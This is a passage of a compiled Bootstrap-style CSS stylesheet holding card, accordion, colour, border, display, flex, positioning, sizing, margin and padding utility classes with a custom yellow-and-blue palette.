  margin-bottom: 0.75rem; }

@media (min-width: 576px) {
  .card-columns {
    -webkit-column-count: 3;
            column-count: 3;
    -webkit-column-gap: 1.25rem;
            column-gap: 1.25rem;
    orphans: 1;
    widows: 1; }
    .card-columns .card {
      display: inline-block;
      width: 100%; } }

.accordion .card:not(:first-of-type):not(:last-of-type) {
  border-bottom: 0;
  border-radius: 0; }

.accordion .card:not(:first-of-type) .card-header:first-child {
  border-radius: 0; }

.accordion .card:first-of-type {
  border-bottom: 0;
  border-bottom-right-radius: 0;
  border-bottom-left-radius: 0; }

.accordion .card:last-of-type {
  border-top-left-radius: 0;
  border-top-right-radius: 0; }

.media {
  display: -ms-flexbox;
  display: flex;
  -ms-flex-align: start;
      align-items: flex-start; }

.media-body {
  -ms-flex: 1;
      flex: 1; }

.align-baseline {
  vertical-align: baseline !important; }

.align-top {
  vertical-align: top !important; }

.align-middle {
  vertical-align: middle !important; }

.align-bottom {
  vertical-align: bottom !important; }

.align-text-bottom {
  vertical-align: text-bottom !important; }

.align-text-top {
  vertical-align: text-top !important; }

.bg-primary {
  background-color: #ffff00 !important; }

a.bg-primary:hover, a.bg-primary:focus,
button.bg-primary:hover,
button.bg-primary:focus {
  background-color: #cccc00 !important; }

.bg-secondary {
  background-color: #0000ff !important; }

a.bg-secondary:hover, a.bg-secondary:focus,
button.bg-secondary:hover,
button.bg-secondary:focus {
  background-color: #0000cc !important; }

.bg-success {
  background-color: #5cc72a !important; }

a.bg-success:hover, a.bg-success:focus,
button.bg-success:hover,
button.bg-success:focus {
  background-color: #499d21 !important; }

.bg-info {
  background-color: #00e5ff !important; }

a.bg-info:hover, a.bg-info:focus,
button.bg-info:hover,
button.bg-info:focus {
  background-color: #00b7cc !important; }

.bg-warning {
  background-color: #f6c343 !important; }

a.bg-warning:hover, a.bg-warning:focus,
button.bg-warning:hover,
button.bg-warning:focus {
  background-color: #f4b312 !important; }

.bg-danger {
  background-color: #ff1744 !important; }

a.bg-danger:hover, a.bg-danger:focus,
button.bg-danger:hover,
button.bg-danger:focus {
  background-color: #e3002c !important; }

.bg-light {
  background-color: #f8f9fa !important; }

a.bg-light:hover, a.bg-light:focus,
button.bg-light:hover,
button.bg-light:focus {
  background-color: #dae0e5 !important; }

.bg-dark {
  background-color: black !important; }

a.bg-dark:hover, a.bg-dark:focus,
button.bg-dark:hover,
button.bg-dark:focus {
  background-color: black !important; }

.bg-white {
  background-color: #ffffff !important; }

.bg-transparent {
  background-color: transparent !important; }

.border {
  border: 2px solid #e9ecef !important; }

.border-top {
  border-top: 2px solid #e9ecef !important; }

.border-right {
  border-right: 2px solid #e9ecef !important; }

.border-bottom {
  border-bottom: 2px solid #e9ecef !important; }

.border-left {
  border-left: 2px solid #e9ecef !important; }

.border-0 {
  border: 0 !important; }

.border-top-0 {
  border-top: 0 !important; }

.border-right-0 {
  border-right: 0 !important; }

.border-bottom-0 {
  border-bottom: 0 !important; }

.border-left-0 {
  border-left: 0 !important; }

.border-primary {
  border-color: #ffff00 !important; }

.border-secondary {
  border-color: #0000ff !important; }

.border-success {
  border-color: #5cc72a !important; }

.border-info {
  border-color: #00e5ff !important; }

.border-warning {
  border-color: #f6c343 !important; }

.border-danger {
  border-color: #ff1744 !important; }

.border-light {
  border-color: #f8f9fa !important; }

.border-dark {
  border-color: black !important; }

.border-white {
  border-color: #ffffff !important; }

.rounded {
  border-radius: 0.3rem !important; }

.rounded-top {
  border-top-left-radius: 0.3rem !important;
  border-top-right-radius: 0.3rem !important; }

.rounded-right {
  border-top-right-radius: 0.3rem !important;
  border-bottom-right-radius: 0.3rem !important; }

.rounded-bottom {
  border-bottom-right-radius: 0.3rem !important;
  border-bottom-left-radius: 0.3rem !important; }

.rounded-left {
  border-top-left-radius: 0.3rem !important;
  border-bottom-left-radius: 0.3rem !important; }

.rounded-circle {
  border-radius: 50% !important; }

.rounded-0 {
  border-radius: 0 !important; }

.clearfix::after {
  display: block;
  clear: both;
  content: ""; }

.d-none {
  display: none !important; }

.d-inline {
  display: inline !important; }

.d-inline-block {
  display: inline-block !important; }

.d-block {
  display: block !important; }

.d-table {
  display: table !important; }

.d-table-row {
  display: table-row !important; }

.d-table-cell {
  display: table-cell !important; }

.d-flex {
  display: -ms-flexbox !important;
  display: flex !important; }

.d-inline-flex {
  display: -ms-inline-flexbox !important;
  display: inline-flex !important; }

@media (min-width: 576px) {
  .d-sm-none {
    display: none !important; }
  .d-sm-inline {
    display: inline !important; }
  .d-sm-inline-block {
    display: inline-block !important; }
  .d-sm-block {
    display: block !important; }
  .d-sm-table {
    display: table !important; }
  .d-sm-table-row {
    display: table-row !important; }
  .d-sm-table-cell {
    display: table-cell !important; }
  .d-sm-flex {
    display: -ms-flexbox !important;
    display: flex !important; }
  .d-sm-inline-flex {
    display: -ms-inline-flexbox !important;
    display: inline-flex !important; } }

@media (min-width: 768px) {
  .d-md-none {
    display: none !important; }
  .d-md-inline {
    display: inline !important; }
  .d-md-inline-block {
    display: inline-block !important; }
  .d-md-block {
    display: block !important; }
  .d-md-table {
    display: table !important; }
  .d-md-table-row {
    display: table-row !important; }
  .d-md-table-cell {
    display: table-cell !important; }
  .d-md-flex {
    display: -ms-flexbox !important;
    display: flex !important; }
  .d-md-inline-flex {
    display: -ms-inline-flexbox !important;
    display: inline-flex !important; } }

@media (min-width: 992px) {
  .d-lg-none {
    display: none !important; }
  .d-lg-inline {
    display: inline !important; }
  .d-lg-inline-block {
    display: inline-block !important; }
  .d-lg-block {
    display: block !important; }
  .d-lg-table {
    display: table !important; }
  .d-lg-table-row {
    display: table-row !important; }
  .d-lg-table-cell {
    display: table-cell !important; }
  .d-lg-flex {
    display: -ms-flexbox !important;
    display: flex !important; }
  .d-lg-inline-flex {
    display: -ms-inline-flexbox !important;
    display: inline-flex !important; } }

@media (min-width: 1200px) {
  .d-xl-none {
    display: none !important; }
  .d-xl-inline {
    display: inline !important; }
  .d-xl-inline-block {
    display: inline-block !important; }
  .d-xl-block {
    display: block !important; }
  .d-xl-table {
    display: table !important; }
  .d-xl-table-row {
    display: table-row !important; }
  .d-xl-table-cell {
    display: table-cell !important; }
  .d-xl-flex {
    display: -ms-flexbox !important;
    display: flex !important; }
  .d-xl-inline-flex {
    display: -ms-inline-flexbox !important;
    display: inline-flex !important; } }

@media print {
  .d-print-none {
    display: none !important; }
  .d-print-inline {
    display: inline !important; }
  .d-print-inline-block {
    display: inline-block !important; }
  .d-print-block {
    display: block !important; }
  .d-print-table {
    display: table !important; }
  .d-print-table-row {
    display: table-row !important; }
  .d-print-table-cell {
    display: table-cell !important; }
  .d-print-flex {
    display: -ms-flexbox !important;
    display: flex !important; }
  .d-print-inline-flex {
    display: -ms-inline-flexbox !important;
    display: inline-flex !important; } }

.embed-responsive {
  position: relative;
  display: block;
  width: 100%;
  padding: 0;
  overflow: hidden; }
  .embed-responsive::before {
    display: block;
    content: ""; }
  .embed-responsive .embed-responsive-item,
  .embed-responsive iframe,
  .embed-responsive embed,
  .embed-responsive object,
  .embed-responsive video {
    position: absolute;
    top: 0;
    bottom: 0;
    left: 0;
    width: 100%;
    height: 100%;
    border: 0; }

.embed-responsive-21by9::before {
  padding-top: 42.85714%; }

.embed-responsive-16by9::before {
  padding-top: 56.25%; }

.embed-responsive-4by3::before {
  padding-top: 75%; }

.embed-responsive-1by1::before {
  padding-top: 100%; }

.flex-row {
  -ms-flex-direction: row !important;
      flex-direction: row !important; }

.flex-column {
  -ms-flex-direction: column !important;
      flex-direction: column !important; }

.flex-row-reverse {
  -ms-flex-direction: row-reverse !important;
      flex-direction: row-reverse !important; }

.flex-column-reverse {
  -ms-flex-direction: column-reverse !important;
      flex-direction: column-reverse !important; }

.flex-wrap {
  -ms-flex-wrap: wrap !important;
      flex-wrap: wrap !important; }

.flex-nowrap {
  -ms-flex-wrap: nowrap !important;
      flex-wrap: nowrap !important; }

.flex-wrap-reverse {
  -ms-flex-wrap: wrap-reverse !important;
      flex-wrap: wrap-reverse !important; }

.flex-fill {
  -ms-flex: 1 1 auto !important;
      flex: 1 1 auto !important; }

.flex-grow-0 {
  -ms-flex-positive: 0 !important;
      flex-grow: 0 !important; }

.flex-grow-1 {
  -ms-flex-positive: 1 !important;
      flex-grow: 1 !important; }

.flex-shrink-0 {
  -ms-flex-negative: 0 !important;
      flex-shrink: 0 !important; }

.flex-shrink-1 {
  -ms-flex-negative: 1 !important;
      flex-shrink: 1 !important; }

.justify-content-start {
  -ms-flex-pack: start !important;
      justify-content: flex-start !important; }

.justify-content-end {
  -ms-flex-pack: end !important;
      justify-content: flex-end !important; }

.justify-content-center {
  -ms-flex-pack: center !important;
      justify-content: center !important; }

.justify-content-between {
  -ms-flex-pack: justify !important;
      justify-content: space-between !important; }

.justify-content-around {
  -ms-flex-pack: distribute !important;
      justify-content: space-around !important; }

.align-items-start {
  -ms-flex-align: start !important;
      align-items: flex-start !important; }

.align-items-end {
  -ms-flex-align: end !important;
      align-items: flex-end !important; }

.align-items-center {
  -ms-flex-align: center !important;
      align-items: center !important; }

.align-items-baseline {
  -ms-flex-align: baseline !important;
      align-items: baseline !important; }

.align-items-stretch {
  -ms-flex-align: stretch !important;
      align-items: stretch !important; }

.align-content-start {
  -ms-flex-line-pack: start !important;
      align-content: flex-start !important; }

.align-content-end {
  -ms-flex-line-pack: end !important;
      align-content: flex-end !important; }

.align-content-center {
  -ms-flex-line-pack: center !important;
      align-content: center !important; }

.align-content-between {
  -ms-flex-line-pack: justify !important;
      align-content: space-between !important; }

.align-content-around {
  -ms-flex-line-pack: distribute !important;
      align-content: space-around !important; }

.align-content-stretch {
  -ms-flex-line-pack: stretch !important;
      align-content: stretch !important; }

.align-self-auto {
  -ms-flex-item-align: auto !important;
      align-self: auto !important; }

.align-self-start {
  -ms-flex-item-align: start !important;
      align-self: flex-start !important; }

.align-self-end {
  -ms-flex-item-align: end !important;
      align-self: flex-end !important; }

.align-self-center {
  -ms-flex-item-align: center !important;
      align-self: center !important; }

.align-self-baseline {
  -ms-flex-item-align: baseline !important;
      align-self: baseline !important; }

.align-self-stretch {
  -ms-flex-item-align: stretch !important;
      align-self: stretch !important; }

@media (min-width: 576px) {
  .flex-sm-row {
    -ms-flex-direction: row !important;
        flex-direction: row !important; }
  .flex-sm-column {
    -ms-flex-direction: column !important;
        flex-direction: column !important; }
  .flex-sm-row-reverse {
    -ms-flex-direction: row-reverse !important;
        flex-direction: row-reverse !important; }
  .flex-sm-column-reverse {
    -ms-flex-direction: column-reverse !important;
        flex-direction: column-reverse !important; }
  .flex-sm-wrap {
    -ms-flex-wrap: wrap !important;
        flex-wrap: wrap !important; }
  .flex-sm-nowrap {
    -ms-flex-wrap: nowrap !important;
        flex-wrap: nowrap !important; }
  .flex-sm-wrap-reverse {
    -ms-flex-wrap: wrap-reverse !important;
        flex-wrap: wrap-reverse !important; }
  .flex-sm-fill {
    -ms-flex: 1 1 auto !important;
        flex: 1 1 auto !important; }
  .flex-sm-grow-0 {
    -ms-flex-positive: 0 !important;
        flex-grow: 0 !important; }
  .flex-sm-grow-1 {
    -ms-flex-positive: 1 !important;
        flex-grow: 1 !important; }
  .flex-sm-shrink-0 {
    -ms-flex-negative: 0 !important;
        flex-shrink: 0 !important; }
  .flex-sm-shrink-1 {
    -ms-flex-negative: 1 !important;
        flex-shrink: 1 !important; }
  .justify-content-sm-start {
    -ms-flex-pack: start !important;
        justify-content: flex-start !important; }
  .justify-content-sm-end {
    -ms-flex-pack: end !important;
        justify-content: flex-end !important; }
  .justify-content-sm-center {
    -ms-flex-pack: center !important;
        justify-content: center !important; }
  .justify-content-sm-between {
    -ms-flex-pack: justify !important;
        justify-content: space-between !important; }
  .justify-content-sm-around {
    -ms-flex-pack: distribute !important;
        justify-content: space-around !important; }
  .align-items-sm-start {
    -ms-flex-align: start !important;
        align-items: flex-start !important; }
  .align-items-sm-end {
    -ms-flex-align: end !important;
        align-items: flex-end !important; }
  .align-items-sm-center {
    -ms-flex-align: center !important;
        align-items: center !important; }
  .align-items-sm-baseline {
    -ms-flex-align: baseline !important;
        align-items: baseline !important; }
  .align-items-sm-stretch {
    -ms-flex-align: stretch !important;
        align-items: stretch !important; }
  .align-content-sm-start {
    -ms-flex-line-pack: start !important;
        align-content: flex-start !important; }
  .align-content-sm-end {
    -ms-flex-line-pack: end !important;
        align-content: flex-end !important; }
  .align-content-sm-center {
    -ms-flex-line-pack: center !important;
        align-content: center !important; }
  .align-content-sm-between {
    -ms-flex-line-pack: justify !important;
        align-content: space-between !important; }
  .align-content-sm-around {
    -ms-flex-line-pack: distribute !important;
        align-content: space-around !important; }
  .align-content-sm-stretch {
    -ms-flex-line-pack: stretch !important;
        align-content: stretch !important; }
  .align-self-sm-auto {
    -ms-flex-item-align: auto !important;
        align-self: auto !important; }
  .align-self-sm-start {
    -ms-flex-item-align: start !important;
        align-self: flex-start !important; }
  .align-self-sm-end {
    -ms-flex-item-align: end !important;
        align-self: flex-end !important; }
  .align-self-sm-center {
    -ms-flex-item-align: center !important;
        align-self: center !important; }
  .align-self-sm-baseline {
    -ms-flex-item-align: baseline !important;
        align-self: baseline !important; }
  .align-self-sm-stretch {
    -ms-flex-item-align: stretch !important;
        align-self: stretch !important; } }

@media (min-width: 768px) {
  .flex-md-row {
    -ms-flex-direction: row !important;
        flex-direction: row !important; }
  .flex-md-column {
    -ms-flex-direction: column !important;
        flex-direction: column !important; }
  .flex-md-row-reverse {
    -ms-flex-direction: row-reverse !important;
        flex-direction: row-reverse !important; }
  .flex-md-column-reverse {
    -ms-flex-direction: column-reverse !important;
        flex-direction: column-reverse !important; }
  .flex-md-wrap {
    -ms-flex-wrap: wrap !important;
        flex-wrap: wrap !important; }
  .flex-md-nowrap {
    -ms-flex-wrap: nowrap !important;
        flex-wrap: nowrap !important; }
  .flex-md-wrap-reverse {
    -ms-flex-wrap: wrap-reverse !important;
        flex-wrap: wrap-reverse !important; }
  .flex-md-fill {
    -ms-flex: 1 1 auto !important;
        flex: 1 1 auto !important; }
  .flex-md-grow-0 {
    -ms-flex-positive: 0 !important;
        flex-grow: 0 !important; }
  .flex-md-grow-1 {
    -ms-flex-positive: 1 !important;
        flex-grow: 1 !important; }
  .flex-md-shrink-0 {
    -ms-flex-negative: 0 !important;
        flex-shrink: 0 !important; }
  .flex-md-shrink-1 {
    -ms-flex-negative: 1 !important;
        flex-shrink: 1 !important; }
  .justify-content-md-start {
    -ms-flex-pack: start !important;
        justify-content: flex-start !important; }
  .justify-content-md-end {
    -ms-flex-pack: end !important;
        justify-content: flex-end !important; }
  .justify-content-md-center {
    -ms-flex-pack: center !important;
        justify-content: center !important; }
  .justify-content-md-between {
    -ms-flex-pack: justify !important;
        justify-content: space-between !important; }
  .justify-content-md-around {
    -ms-flex-pack: distribute !important;
        justify-content: space-around !important; }
  .align-items-md-start {
    -ms-flex-align: start !important;
        align-items: flex-start !important; }
  .align-items-md-end {
    -ms-flex-align: end !important;
        align-items: flex-end !important; }
  .align-items-md-center {
    -ms-flex-align: center !important;
        align-items: center !important; }
  .align-items-md-baseline {
    -ms-flex-align: baseline !important;
        align-items: baseline !important; }
  .align-items-md-stretch {
    -ms-flex-align: stretch !important;
        align-items: stretch !important; }
  .align-content-md-start {
    -ms-flex-line-pack: start !important;
        align-content: flex-start !important; }
  .align-content-md-end {
    -ms-flex-line-pack: end !important;
        align-content: flex-end !important; }
  .align-content-md-center {
    -ms-flex-line-pack: center !important;
        align-content: center !important; }
  .align-content-md-between {
    -ms-flex-line-pack: justify !important;
        align-content: space-between !important; }
  .align-content-md-around {
    -ms-flex-line-pack: distribute !important;
        align-content: space-around !important; }
  .align-content-md-stretch {
    -ms-flex-line-pack: stretch !important;
        align-content: stretch !important; }
  .align-self-md-auto {
    -ms-flex-item-align: auto !important;
        align-self: auto !important; }
  .align-self-md-start {
    -ms-flex-item-align: start !important;
        align-self: flex-start !important; }
  .align-self-md-end {
    -ms-flex-item-align: end !important;
        align-self: flex-end !important; }
  .align-self-md-center {
    -ms-flex-item-align: center !important;
        align-self: center !important; }
  .align-self-md-baseline {
    -ms-flex-item-align: baseline !important;
        align-self: baseline !important; }
  .align-self-md-stretch {
    -ms-flex-item-align: stretch !important;
        align-self: stretch !important; } }

@media (min-width: 992px) {
  .flex-lg-row {
    -ms-flex-direction: row !important;
        flex-direction: row !important; }
  .flex-lg-column {
    -ms-flex-direction: column !important;
        flex-direction: column !important; }
  .flex-lg-row-reverse {
    -ms-flex-direction: row-reverse !important;
        flex-direction: row-reverse !important; }
  .flex-lg-column-reverse {
    -ms-flex-direction: column-reverse !important;
        flex-direction: column-reverse !important; }
  .flex-lg-wrap {
    -ms-flex-wrap: wrap !important;
        flex-wrap: wrap !important; }
  .flex-lg-nowrap {
    -ms-flex-wrap: nowrap !important;
        flex-wrap: nowrap !important; }
  .flex-lg-wrap-reverse {
    -ms-flex-wrap: wrap-reverse !important;
        flex-wrap: wrap-reverse !important; }
  .flex-lg-fill {
    -ms-flex: 1 1 auto !important;
        flex: 1 1 auto !important; }
  .flex-lg-grow-0 {
    -ms-flex-positive: 0 !important;
        flex-grow: 0 !important; }
  .flex-lg-grow-1 {
    -ms-flex-positive: 1 !important;
        flex-grow: 1 !important; }
  .flex-lg-shrink-0 {
    -ms-flex-negative: 0 !important;
        flex-shrink: 0 !important; }
  .flex-lg-shrink-1 {
    -ms-flex-negative: 1 !important;
        flex-shrink: 1 !important; }
  .justify-content-lg-start {
    -ms-flex-pack: start !important;
        justify-content: flex-start !important; }
  .justify-content-lg-end {
    -ms-flex-pack: end !important;
        justify-content: flex-end !important; }
  .justify-content-lg-center {
    -ms-flex-pack: center !important;
        justify-content: center !important; }
  .justify-content-lg-between {
    -ms-flex-pack: justify !important;
        justify-content: space-between !important; }
  .justify-content-lg-around {
    -ms-flex-pack: distribute !important;
        justify-content: space-around !important; }
  .align-items-lg-start {
    -ms-flex-align: start !important;
        align-items: flex-start !important; }
  .align-items-lg-end {
    -ms-flex-align: end !important;
        align-items: flex-end !important; }
  .align-items-lg-center {
    -ms-flex-align: center !important;
        align-items: center !important; }
  .align-items-lg-baseline {
    -ms-flex-align: baseline !important;
        align-items: baseline !important; }
  .align-items-lg-stretch {
    -ms-flex-align: stretch !important;
        align-items: stretch !important; }
  .align-content-lg-start {
    -ms-flex-line-pack: start !important;
        align-content: flex-start !important; }
  .align-content-lg-end {
    -ms-flex-line-pack: end !important;
        align-content: flex-end !important; }
  .align-content-lg-center {
    -ms-flex-line-pack: center !important;
        align-content: center !important; }
  .align-content-lg-between {
    -ms-flex-line-pack: justify !important;
        align-content: space-between !important; }
  .align-content-lg-around {
    -ms-flex-line-pack: distribute !important;
        align-content: space-around !important; }
  .align-content-lg-stretch {
    -ms-flex-line-pack: stretch !important;
        align-content: stretch !important; }
  .align-self-lg-auto {
    -ms-flex-item-align: auto !important;
        align-self: auto !important; }
  .align-self-lg-start {
    -ms-flex-item-align: start !important;
        align-self: flex-start !important; }
  .align-self-lg-end {
    -ms-flex-item-align: end !important;
        align-self: flex-end !important; }
  .align-self-lg-center {
    -ms-flex-item-align: center !important;
        align-self: center !important; }
  .align-self-lg-baseline {
    -ms-flex-item-align: baseline !important;
        align-self: baseline !important; }
  .align-self-lg-stretch {
    -ms-flex-item-align: stretch !important;
        align-self: stretch !important; } }

@media (min-width: 1200px) {
  .flex-xl-row {
    -ms-flex-direction: row !important;
        flex-direction: row !important; }
  .flex-xl-column {
    -ms-flex-direction: column !important;
        flex-direction: column !important; }
  .flex-xl-row-reverse {
    -ms-flex-direction: row-reverse !important;
        flex-direction: row-reverse !important; }
  .flex-xl-column-reverse {
    -ms-flex-direction: column-reverse !important;
        flex-direction: column-reverse !important; }
  .flex-xl-wrap {
    -ms-flex-wrap: wrap !important;
        flex-wrap: wrap !important; }
  .flex-xl-nowrap {
    -ms-flex-wrap: nowrap !important;
        flex-wrap: nowrap !important; }
  .flex-xl-wrap-reverse {
    -ms-flex-wrap: wrap-reverse !important;
        flex-wrap: wrap-reverse !important; }
  .flex-xl-fill {
    -ms-flex: 1 1 auto !important;
        flex: 1 1 auto !important; }
  .flex-xl-grow-0 {
    -ms-flex-positive: 0 !important;
        flex-grow: 0 !important; }
  .flex-xl-grow-1 {
    -ms-flex-positive: 1 !important;
        flex-grow: 1 !important; }
  .flex-xl-shrink-0 {
    -ms-flex-negative: 0 !important;
        flex-shrink: 0 !important; }
  .flex-xl-shrink-1 {
    -ms-flex-negative: 1 !important;
        flex-shrink: 1 !important; }
  .justify-content-xl-start {
    -ms-flex-pack: start !important;
        justify-content: flex-start !important; }
  .justify-content-xl-end {
    -ms-flex-pack: end !important;
        justify-content: flex-end !important; }
  .justify-content-xl-center {
    -ms-flex-pack: center !important;
        justify-content: center !important; }
  .justify-content-xl-between {
    -ms-flex-pack: justify !important;
        justify-content: space-between !important; }
  .justify-content-xl-around {
    -ms-flex-pack: distribute !important;
        justify-content: space-around !important; }
  .align-items-xl-start {
    -ms-flex-align: start !important;
        align-items: flex-start !important; }
  .align-items-xl-end {
    -ms-flex-align: end !important;
        align-items: flex-end !important; }
  .align-items-xl-center {
    -ms-flex-align: center !important;
        align-items: center !important; }
  .align-items-xl-baseline {
    -ms-flex-align: baseline !important;
        align-items: baseline !important; }
  .align-items-xl-stretch {
    -ms-flex-align: stretch !important;
        align-items: stretch !important; }
  .align-content-xl-start {
    -ms-flex-line-pack: start !important;
        align-content: flex-start !important; }
  .align-content-xl-end {
    -ms-flex-line-pack: end !important;
        align-content: flex-end !important; }
  .align-content-xl-center {
    -ms-flex-line-pack: center !important;
        align-content: center !important; }
  .align-content-xl-between {
    -ms-flex-line-pack: justify !important;
        align-content: space-between !important; }
  .align-content-xl-around {
    -ms-flex-line-pack: distribute !important;
        align-content: space-around !important; }
  .align-content-xl-stretch {
    -ms-flex-line-pack: stretch !important;
        align-content: stretch !important; }
  .align-self-xl-auto {
    -ms-flex-item-align: auto !important;
        align-self: auto !important; }
  .align-self-xl-start {
    -ms-flex-item-align: start !important;
        align-self: flex-start !important; }
  .align-self-xl-end {
    -ms-flex-item-align: end !important;
        align-self: flex-end !important; }
  .align-self-xl-center {
    -ms-flex-item-align: center !important;
        align-self: center !important; }
  .align-self-xl-baseline {
    -ms-flex-item-align: baseline !important;
        align-self: baseline !important; }
  .align-self-xl-stretch {
    -ms-flex-item-align: stretch !important;
        align-self: stretch !important; } }

.float-left {
  float: left !important; }

.float-right {
  float: right !important; }

.float-none {
  float: none !important; }

@media (min-width: 576px) {
  .float-sm-left {
    float: left !important; }
  .float-sm-right {
    float: right !important; }
  .float-sm-none {
    float: none !important; } }

@media (min-width: 768px) {
  .float-md-left {
    float: left !important; }
  .float-md-right {
    float: right !important; }
  .float-md-none {
    float: none !important; } }

@media (min-width: 992px) {
  .float-lg-left {
    float: left !important; }
  .float-lg-right {
    float: right !important; }
  .float-lg-none {
    float: none !important; } }

@media (min-width: 1200px) {
  .float-xl-left {
    float: left !important; }
  .float-xl-right {
    float: right !important; }
  .float-xl-none {
    float: none !important; } }

.position-static {
  position: static !important; }

.position-relative {
  position: relative !important; }

.position-absolute {
  position: absolute !important; }

.position-fixed {
  position: fixed !important; }

.position-sticky {
  position: -webkit-sticky !important;
  position: sticky !important; }

.fixed-top {
  position: fixed;
  top: 0;
  right: 0;
  left: 0;
  z-index: 1030; }

.fixed-bottom {
  position: fixed;
  right: 0;
  bottom: 0;
  left: 0;
  z-index: 1030; }

@supports ((position: -webkit-sticky) or (position: sticky)) {
  .sticky-top {
    position: -webkit-sticky;
    position: sticky;
    top: 0;
    z-index: 1020; } }

.sr-only {
  position: absolute;
  width: 1px;
  height: 1px;
  padding: 0;
  overflow: hidden;
  clip: rect(0, 0, 0, 0);
  white-space: nowrap;
  border: 0; }

.sr-only-focusable:active, .sr-only-focusable:focus {
  position: static;
  width: auto;
  height: auto;
  overflow: visible;
  clip: auto;
  white-space: normal; }

.shadow-sm {
  box-shadow: 0 0.125rem 0.25rem rgba(0, 0, 0, 0.075) !important; }

.shadow {
  box-shadow: 0 0.5rem 1rem rgba(0, 0, 0, 0.15) !important; }

.shadow-lg {
  box-shadow: 0 1rem 3rem rgba(0, 0, 0, 0.175) !important; }

.shadow-none {
  box-shadow: none !important; }

.w-25 {
  width: 25% !important; }

.w-50 {
  width: 50% !important; }

.w-75 {
  width: 75% !important; }

.w-100 {
  width: 100% !important; }

.w-auto {
  width: auto !important; }

.h-25 {
  height: 25% !important; }

.h-50 {
  height: 50% !important; }

.h-75 {
  height: 75% !important; }

.h-100 {
  height: 100% !important; }

.h-auto {
  height: auto !important; }

.mw-100 {
  max-width: 100% !important; }

.mh-100 {
  max-height: 100% !important; }

.m-0 {
  margin: 0 !important; }

.mt-0,
.my-0 {
  margin-top: 0 !important; }

.mr-0,
.mx-0 {
  margin-right: 0 !important; }

.mb-0,
.my-0 {
  margin-bottom: 0 !important; }

.ml-0,
.mx-0 {
  margin-left: 0 !important; }

.m-1 {
  margin: 0.25rem !important; }

.mt-1,
.my-1 {
  margin-top: 0.25rem !important; }

.mr-1,
.mx-1 {
  margin-right: 0.25rem !important; }

.mb-1,
.my-1 {
  margin-bottom: 0.25rem !important; }

.ml-1,
.mx-1 {
  margin-left: 0.25rem !important; }

.m-2 {
  margin: 0.5rem !important; }

.mt-2,
.my-2 {
  margin-top: 0.5rem !important; }

.mr-2,
.mx-2 {
  margin-right: 0.5rem !important; }

.mb-2,
.my-2 {
  margin-bottom: 0.5rem !important; }

.ml-2,
.mx-2 {
  margin-left: 0.5rem !important; }

.m-3 {
  margin: 1rem !important; }

.mt-3,
.my-3 {
  margin-top: 1rem !important; }

.mr-3,
.mx-3 {
  margin-right: 1rem !important; }

.mb-3,
.my-3 {
  margin-bottom: 1rem !important; }

.ml-3,
.mx-3 {
  margin-left: 1rem !important; }

.m-4 {
  margin: 1.5rem !important; }

.mt-4,
.my-4 {
  margin-top: 1.5rem !important; }

.mr-4,
.mx-4 {
  margin-right: 1.5rem !important; }

.mb-4,
.my-4 {
  margin-bottom: 1.5rem !important; }

.ml-4,
.mx-4 {
  margin-left: 1.5rem !important; }

.m-5 {
  margin: 3rem !important; }

.mt-5,
.my-5 {
  margin-top: 3rem !important; }

.mr-5,
.mx-5 {
  margin-right: 3rem !important; }

.mb-5,
.my-5 {
  margin-bottom: 3rem !important; }

.ml-5,
.mx-5 {
  margin-left: 3rem !important; }

.m-6 {
  margin: 6rem !important; }

.mt-6,
.my-6 {
  margin-top: 6rem !important; }

.mr-6,
.mx-6 {
  margin-right: 6rem !important; }

.mb-6,
.my-6 {
  margin-bottom: 6rem !important; }

.ml-6,
.mx-6 {
  margin-left: 6rem !important; }

.m-7 {
  margin: 9rem !important; }

.mt-7,
.my-7 {
  margin-top: 9rem !important; }

.mr-7,
.mx-7 {
  margin-right: 9rem !important; }

.mb-7,
.my-7 {
  margin-bottom: 9rem !important; }

.ml-7,
.mx-7 {
  margin-left: 9rem !important; }

.m-8 {
  margin: 12rem !important; }

.mt-8,
.my-8 {
  margin-top: 12rem !important; }

.mr-8,
.mx-8 {
  margin-right: 12rem !important; }

.mb-8,
.my-8 {
  margin-bottom: 12rem !important; }

.ml-8,
.mx-8 {
  margin-left: 12rem !important; }

.m-9 {
  margin: 15rem !important; }

.mt-9,
.my-9 {
  margin-top: 15rem !important; }

.mr-9,
.mx-9 {
  margin-right: 15rem !important; }

.mb-9,
.my-9 {
  margin-bottom: 15rem !important; }

.ml-9,
.mx-9 {
  margin-left: 15rem !important; }

.p-0 {
  padding: 0 !important; }

.pt-0,
.py-0 {
  padding-top: 0 !important; }

.pr-0,
.px-0 {
  padding-right: 0 !important; }

.pb-0,
.py-0 {
  padding-bottom: 0 !important; }

.pl-0,
.px-0 {
  padding-left: 0 !important; }

.p-1 {
  padding: 0.25rem !important; }

.pt-1,
.py-1 {
  padding-top: 0.25rem !important; }

.pr-1,
.px-1 {
  padding-right: 0.25rem !important; }

.pb-1,
.py-1 {
  padding-bottom: 0.25rem !important; }

.pl-1,
.px-1 {
  padding-left: 0.25rem !important; }

.p-2 {
  padding: 0.5rem !important; }

.pt-2,
.py-2 {
  padding-top: 0.5rem !important; }

.pr-2,
.px-2 {
  padding-right: 0.5rem !important; }

.pb-2,
.py-2 {
  padding-bottom: 0.5rem !important; }

.pl-2,
.px-2 {
  padding-left: 0.5rem !important; }

.p-3 {
  padding: 1rem !important; }

.pt-3,
.py-3 {
  padding-top: 1rem !important; }

.pr-3,
.px-3 {
  padding-right: 1rem !important; }

.pb-3,
.py-3 {
  padding-bottom: 1rem !important; }

.pl-3,
.px-3 {
  padding-left: 1rem !important; }

.p-4 {
  padding: 1.5rem !important; }

.pt-4,
.py-4 {
  padding-top: 1.5rem !important; }

.pr-4,
.px-4 {
  padding-right: 1.5rem !important; }

.pb-4,
.py-4 {
  padding-bottom: 1.5rem !important; }

.pl-4,
.px-4 {
  padding-left: 1.5rem !important; }

.p-5 {
  padding: 3rem !important; }

.pt-5,
.py-5 {
  padding-top: 3rem !important; }

.pr-5,
.px-5 {
  padding-right: 3rem !important; }

.pb-5,
.py-5 {
  padding-bottom: 3rem !important; }

.pl-5,
.px-5 {
  padding-left: 3rem !important; }

.p-6 {
  padding: 6rem !important; }

.pt-6,
.py-6 {
  padding-top: 6rem !important; }

.pr-6,
.px-6 {
  padding-right: 6rem !important; }

.pb-6,
.py-6 {
  padding-bottom: 6rem !important; }

.pl-6,
.px-6 {
  padding-left: 6rem !important; }

.p-7 {
  padding: 9rem !important; }

.pt-7,
.py-7 {
  padding-top: 9rem !important; }

.pr-7,
.px-7 {
  padding-right: 9rem !important; }

.pb-7,
.py-7 {
  padding-bottom: 9rem !important; }

.pl-7,
.px-7 {
